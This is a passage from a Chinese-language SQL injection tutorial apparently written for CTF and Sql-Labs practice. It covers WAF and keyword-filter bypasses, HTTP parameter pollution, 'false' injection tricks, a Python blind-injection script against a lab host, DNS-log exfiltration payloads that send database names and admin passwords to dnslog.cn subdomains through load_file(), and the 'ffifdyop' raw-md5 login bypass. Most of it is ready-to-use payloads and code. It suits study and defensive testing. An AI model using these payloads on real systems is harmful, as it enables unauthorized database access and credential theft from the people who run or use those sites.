select `3` from (select 1,2,3 union select * from users)a;
```

[![img](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102802-651hm3o.png)](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102802-651hm3o.png)

末尾的 a 可以是任意字符，用于命名

当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：

```
select b from (select 1,2,3 as b union select * from admin)a;
```

##### join

我们可以利用爆错，借助join和using爆出列名，id为第一列，username为第二列，可以逐个爆出，爆出全部列名之后即可得到列内数据。

[![img](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129140931-xh6qnfj.png)](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129140931-xh6qnfj.png)

#### 过滤其他关键字绕过

##### 过滤 if 语句绕过

如果过滤了 if 关键字的话，我们可以使用case when语句绕过：

```
if(condition,1,0) <=> case when condition then 1 else 0 end
```

下面的if语句和case when语句是等效的：

```
0' or if((ascii(substr((select database()),1,1))>97),1,0)#

0' or case when ascii(substr((select database()),1,1))>97 then 1 else 0 end#
```

#### 过滤 substr 绕过

##### 使用 lpad/lpad

- 使用lpad()和rpad()绕过substr()

```
select lpad((select database()),1,1)    // s
select lpad((select database()),2,1)    // se
select lpad((select database()),3,1)    // sec
select lpad((select database()),4,1)    // secu
select lpad((select database()),5,1)    // secur
select lpad((select database()),6,1)    // securi
select lpad((select database()),7,1)    // securit
select lpad((select database()),8,1)    // security

select rpad((select database()),1,1)    // s
select rpad((select database()),2,1)    // se
select rpad((select database()),3,1)    // sec
select rpad((select database()),4,1)    // secu
select rpad((select database()),5,1)    // secur
select rpad((select database()),6,1)    // securi
select rpad((select database()),7,1)    // securit
select rpad((select database()),8,1)    // security
```

lpad：函数语法：`lpad(str1,length,str2)`。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。

rpad：同理

- 使用left()绕过substr()

```
select left((select database()),1)    // s
select left((select database()),2)    // se
select left((select database()),3)    // sec
select left((select database()),4)    // secu
select left((select database()),5)    // secur
select left((select database()),6)    // securi
select left((select database()),7)    // securit
select left((select database()),8)    // security
```

- 使用mid()绕过substr()

mid()函数的使用就和substr()函数一样了：

```
select mid((select database()),1,1)    // s
select mid((select database()),2,1)    // e
select mid((select database()),3,1)    // c
select mid((select database()),4,1)    // u
select mid((select database()),5,1)    // r
......
```

- 还可以使用下面这个神奇的东西绕过

```
select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s
select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e
select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c
select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u
select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r
select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i
select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t
......
```

INSERT( *string* , *position* , *number* , *string2* )

INSERT()函数在指定位置的字符串中插入一个字符串，并插入一定数量的字符。

| 参数       | 描述                           |
| ---------- | ------------------------------ |
| *string*   | 必须项。要修改的字符串         |
| *position* | 必须项。插入*string2*的位置    |
| *number*   | 必须项。要替换的字符数         |
| *string2*  | 必须项。要插入*字符串的字符串* |

#### HTTP参数污染(HPP)漏洞绕过 Waf

HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。浏览器在跟服务器进行交互的过程中，浏览器往往会在GET或POST请求里面带上参数，这些参数会以 键-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。

但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：`http://www.baidu.com?name=aa&name=bb`，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是 `name=aa`。有的服务器是取第二个参数，也就是 `name=bb`。有的服务器两个参数都取，也就是 `name=aa,bb`。这种特性在绕过一些服务器端的逻辑判断时，非常有用。

HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同类型的Web服务器对于出现多个参数时的选择：

| **Web 服务器**       | **参数获取函数**          | **获取到的参数** |
| -------------------- | ------------------------- | ---------------- |
| **PHP/Apache**       | $_GET['a']                | Last             |
| **JSP/Tomcat**       | Request.getParameter('a') | First            |
| **Perl(CGI)/Apache** | Param('a')                | First            |
| **Python/Apache**    | getvalue('a')             | All              |
| **ASP/IIS**          | Request.QueryString('a')  | All              |

假设服务器端有两个部分：第一部分是Tomcat为引擎的JSP/Tomcat型服务器，第二部分是Apache为引擎的PHP/Apache型服务器。第一部分的JSP/Tomcat服务器处做数据过滤和处理，功能类似为一个WAF，而真正提供Web服务的是PHP/Apache服务器。那么服务端的工作流程为：客户端访问服务器，能直接访问到JSP/Tomcat服务器，然后JSP/Tomcat服务器再向PHP/Apache服务器请求数据。数据返回路径则相反。

那么此时我们便可以利用不同服务器解析参数的位置不同绕过WAF的检测。来看看如下请求：

```
index.jsp?id=1&id=2
```

客户端请求首先过JSP/Tomcat服务器，JSP/Tomcat服务器解析第一个参数，接下来JSP/Tomcat服务器去请求PHP/Apache服务器，PHP/Apache服务器解析最后一个参数。假设JSP/Tomcat服务器作为Waf对第一个参数进行检测，那我们便可以在第二个参数中传payload来绕过Waf。如下所示：

```
/index.jsp?id=1&id=-1' union select 1,database(),3--+
```

这样 Waf 可能只检测第一个参数 `id=1`，而PHP脚本真正识别的是 `id=select database()--+`

[例题]Sql-Labs Less-29

#### False 注入绕过

##### False 注入原理

前面我们学过的注入都是基于1=1这样比较的普通注入，下面来说一说 False 注入，利用 False 我们可以绕过一些特定的 WAF 以及一些未来不确定的因素。

首先我们来看一看下面这个sql查询语句：

```
select * from user where uesrname = 0;
```

[![img](https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203530-sxree7q.png)](https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203530-sxree7q.png)

为什么 `username = 0` 会导致返回数据，而且是全部数据呢？

这就是一个基于 False 注入的例子，下面再举一个例子：

```
select * from user where username = 0;
```

[![img](https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203516-cfavxud.png)](https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203516-cfavxud.png)

和上面是同一个表，但是为什么这里只返回了两组数据呢？说到这里不得不说一说有关于 MYSQL 的隐式类型转换。

MYSQL 的隐式类型转换，即当字符串和数字比较时，会把字符串转为浮点数，而字符串转换为浮点数很明显会转换失败，这时就会产生一个warning，转换的结果为0，然后`0 = 0` 返回的是 `True` ，这样就将表中的数据全部返回了。但如果字符串开头是数字话还是会从数字部分截断，转换为数字进行比较，在第二个例子中，passwd 字段中有一个值是以数字1开头的并非为0，再进行 `passwd = 0` 比较时，会从1开始截断，`1 = 0` 不成立，当然就只返回两条数据了。这就是 MYSQL False 注入的原理。

##### False 注入利用

下面我们讲讲 False 注入如何利用，及如何构造 False 注入的利用点。在实际中我们接触到的语句都是带有引号的，如下：

```
select * from user where username ='.$username.';
```

在这种情况下，我们如何绕过引号构造出 0 这个值呢，我们需要做一些处理来构造false注入的**利用点**？

可以使用的姿势有很多，比如下面的算数运算：

- 利用算数运算

加：+

```
插入'+', 拼接的语句: select * from user where username =''+'';
```

减：-

```
插入'-', 拼接的语句: select * from user where username =''-'';
```

乘：*

```
插入'*', 拼接的语句: select * from user where username =''*'';
```

除：/

```
插入'/6#, 拼接的语句: select * from user where username =''/6#';
```

取余：%

```
插入'%1#, 拼接的语句: select * from user where username =''%1#';
```

- 利用位操作运算

我们还可以使用当字符串和数字运算的时候类型转换的问题进行利用。

和运算：&

```
插入'&0#, 拼接的语句: select * from user where username =''&0#';
```

或运算：|

```
插入'|0#, 拼接的语句: select * from user where username =''|0#';
```

异或运算：^

```
插入'^0#, 拼接的语句: select * from user where username =''^0#';
```

移位操作：

```
插入'<<0# 或 '>>0#, 拼接的语句: 
select * from user where username =''<<0#';
select * from user where username =''>>0#';
```

- 利用比较运算符

安全等于：<=>

```
'=0<=>1# 拼接的语句：where username=''=0<=>1#'
```

不等于<>(!=)

```
'=0<>0# 拼接的语句：where username=''=0<>0#'
```

大小于>或<

```
'>-1# 拼接的语句：where username=''>-1#
```

- 其他

```
'+1 is not null#  'in(-1,1)#  'not in(1,0)#  'like 1#  'REGEXP 1#  'BETWEEN 1 AND 1#  'div 1#  'xor 1#  '=round(0,1)='1  '<>ifnull(1,2)='1
```

##### 综合利用

false注入这种注入方式有的优势就是，**在某些特定时候可以绕过WAF或者是一些其他的绕过**。

这里举例一道题

```
<?php  
include("config.php");  
$conn ->query("set names utf8");  

function randStr($lenth=32){
     $strBase = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
     $str = "";
     while($lenth>0){
       $str.=substr($strBase,rand(0,strlen($strBase)-1),1);
       $lenth --;
     }
    return $str;
}
if($install){
     $sql = "create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci ";
     if($conn->query($sql)){
        $sql  = "insert into `user`(`username`,`passwd`,`role`) values ('admin','".md5(randStr())."','admin')";
        $conn -> query($sql);
     }
 }  

function filter($str){
      $filter = "/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
      if(preg_match($filter,$str)){
          die("you can't input this illegal char!");
      }
      return $str;
  }   

function show($username){
   global $conn;
   $sql = "select role from `user` where username ='".$username."'";
   $res = $conn ->query($sql);
   if($res->num_rows>0){
        echo "$username is ".$res->fetch_assoc()['role'];
   }else{
        die("Don't have this user!");
   }
 }  

function login($username,$passwd){
     global $conn;
     global $flag;
     $username = trim(strtolower($username));
     $passwd = trim(strtolower($passwd));
     if($username == 'admin'){
         die("you can't login this as admin!");
     }  
     $sql = "select * from `user` where username='".$conn->escape_string($username)."' and passwd='".$conn->escape_string($passwd)."'";
     $res = $conn ->query($sql);
     if($res->num_rows>0){
           if($res->fetch_assoc()['role'] === 'admin') exit($flag);
     }else{ 
           echo "sorry,username or passwd error!";
     }
 }
  function source(){
      highlight_file(__FILE__);
 }
  $username = isset($_POST['username'])?filter($_POST['username']):"";
  $passwd = isset($_POST['passwd'])?filter($_POST['passwd']):"";
  $action = isset($_GET['action'])?filter($_GET['action']):"source";

switch($action){
    case "source": source(); break ;
    case "login" : login($username,$passwd);break;
    case "show" : show($username);break; 
}
```

我们注意到`filter()`函数

```
$filter = "/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
```

这里看起来过滤的比较多，其中and，or还有&，|都被过滤了，这个时候就可以利用**false进行盲注**。

可以在show函数利用查询的时候注入，

```
username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
```

这里官方给出的就是利用异或，其实这里并不需要 admin 只要是一串字符串就可以

异或会使字符串都转为浮点型，都变为了0，由于`0=0^0 -> 1^0 -> 1` 当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如'`+`'、'`^`'、'`/4#`' 这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。

##### 盲注脚本

```
import requests

flag = ''

for i in range(1,33):
    for str in "abcdefghijklmnopkrstuvwxyz":
        url = "http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id='^(mid((select database())from(-{0}))='{1}')='1".format(i,str+flag)
        res = requests.get(url=url)
        if "You are in..........." in res.text:
            flag = str+flag
            print(flag)
```

#### DNS注入

##### 原理

通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。

在无法直接利用的情况下，但是可以通过DNS请求,通过DNSlog，把数据外带，用DNS解析记录查看。

##### LOAD_FILE() 读取文件的函数

> 读取文件并返回文件内容为字符串。
>
> 要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。

**注：这个功能不是默认开启的，需要在mysql配置文件加一句 secure_file_priv=**

##### DNSLOG平台:

> https://dns.xn--9tr.com/
>
> https://log.xn--9tr.com/

##### UNC路径

> UNC路径通用命名规则，也称通用命名规范、通用命名约定，类似\softer这样的形式的网络路径。

UNC路径的 **格式** ：**\server\sharename\directory\filename**

等同于**SELECT LOAD_FILE('//库名.1806dl.dnslog.cn/abc'**

去访问 库名.1806dl.dnslog.cn 的服务器下的共享文件夹abc。

然后1806dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error.1806dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了

payload示例：

```
?id=1 and load_file(concat('//', database(),'.htleyd.dnslog.cn/abc'))
?id=1 and load_file(concat('//', (select table_name from information_schema.tables where table_schema=database() limit 0,1 ),'.htleyd.dnslog.cn/abc'))
?id=1 and load_file(concat('//',(select column_name from information_schema.columns where table_name=’admin’ and table_schema=database() limit 2,1),'.htleyd.dnslog.cn/abc'))
?id=1 and load_file(concat('//',(select password from admin limit 0,1),'.htleyd.dnslog.cn/abc'))
```

#### '".md5($pass,true)."' 登录绕过

很多站点为了安全都会利用这样的语句：

```
SELECT * FROM users WHERE password = '.md5($password,true).';
```

`md5(string,true)` 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：`'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c`：

[![img](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129143258-ladbvll.png)](https://b3logfile.com/siyuan/1621238442570/assets/image-20211129143258-ladbvll.png)

这不是普通的二进制字符串，而是 `'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c` 这种，这样的话就会和前面的形成闭合，构成万能密码。

```
SELECT * FROM users WHERE password = ''or'6.......'
```

这就是永真的了，这就是一个万能密码了相当于 `1' or 1=1#` 或 `1' or 1#`。

> 但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？
>
> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于 password=‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password=‘xxx’ or 1，那么返回值也是 true。（xxx指代任意字符）

接下来就是找到这样子的字符串，这里给出两个吧。

ffifdyop：

```
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```

129581926211651571912466741651878684928：

```
content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
string: T0Do#'or'8
```